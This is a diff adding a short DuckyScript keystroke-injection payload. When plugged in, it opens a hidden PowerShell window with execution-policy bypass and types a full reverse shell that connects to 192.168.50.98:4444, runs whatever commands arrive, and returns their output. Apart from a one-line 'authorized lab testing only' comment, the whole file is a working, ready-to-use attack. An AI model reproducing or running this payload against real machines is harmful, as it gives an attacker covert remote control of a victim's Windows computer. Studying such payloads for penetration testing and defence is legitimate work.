@@ -1,0 +1,11 @@
+REM Windows PowerShell reverse shell (192.168.50.98:4444)
+REM Author: Ansfidine Youssouf
+REM WARNING: For authorized lab testing only.
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1500
+STRING $client = New-Object System.Net.Sockets.TCPClient("192.168.50.98",4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }
+ENTER
